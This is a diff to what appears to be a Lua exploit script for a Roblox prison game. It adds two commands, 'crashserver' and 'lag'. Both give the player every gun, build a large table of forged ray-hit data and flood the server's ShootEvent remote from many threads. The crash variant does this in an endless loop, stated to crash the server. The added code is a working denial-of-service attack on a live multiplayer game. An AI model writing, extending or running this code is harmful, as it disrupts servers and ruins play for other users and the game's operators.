@@ -890,6 +890,51 @@ do
 		wait()
 		MoveTo(pos)
 	end,"puts you into guards team")
+	Add_Command("crashserver",function(Args)
+		local Args = GetArgs(Args)
+		All_Guns()
+		wait(.7)
+		local T = {}
+		for i =1,12000 do
+			T[#T+1] = unpack({
+				["RayObject"] = Ray.new(Vector3.new(780.852478, 99.4999161, 2568.36914), Vector3.new(308.161377, -90.2463608, -238.520844)),
+				["Distance"] = 15.429909706115723,
+				["Cframe"] = CFrame.new(790.130249, 97.1738739, 2562.07666, -0.683907807, 0.18761155, 0.705033362, 0, 0.966370463, -0.257154137, -0.729568481, -0.175869718, -0.660908222),
+				["Hit"] = workspace:FindFirstChildOfClass("Part")
+			})
+		end
+		local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack["Remington 870"]
+		for i =1,40 do
+			task.spawn(function()
+				game:GetService("ReplicatedStorage").ShootEvent:FireServer(T, ohInstance2)
+			end)
+		end
+		wait(.7)
+		while task.wait() do
+			game:GetService("ReplicatedStorage").ShootEvent:FireServer(T, ohInstance2)
+		end
+	end,"Crashes the server")
+	Add_Command("lag",function(Args)
+		local Args = GetArgs(Args)
+		All_Guns()
+		wait(.7)
+		local T = {}
+		for i =1,100 do
+			T[#T+1] = unpack({
+				["RayObject"] = Ray.new(Vector3.new(780.852478, 99.4999161, 2568.36914), Vector3.new(308.161377, -90.2463608, -238.520844)),
+				["Distance"] = 15.429909706115723,
+				["Cframe"] = CFrame.new(790.130249, 97.1738739, 2562.07666, -0.683907807, 0.18761155, 0.705033362, 0, 0.966370463, -0.257154137, -0.729568481, -0.175869718, -0.660908222),
+				["Hit"] = workspace:FindFirstChildOfClass("Part")
+			})
+		end
+		local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack["Remington 870"]
+
+		for i =1,30 do
+			task.spawn(function()
+				game:GetService("ReplicatedStorage").ShootEvent:FireServer(T, ohInstance2)
+			end)
+		end
+	end,"lags the server")
 	Add_Command("inmate",function(Args)
 		local Args = GetArgs(Args)
 		local pos = getpos()
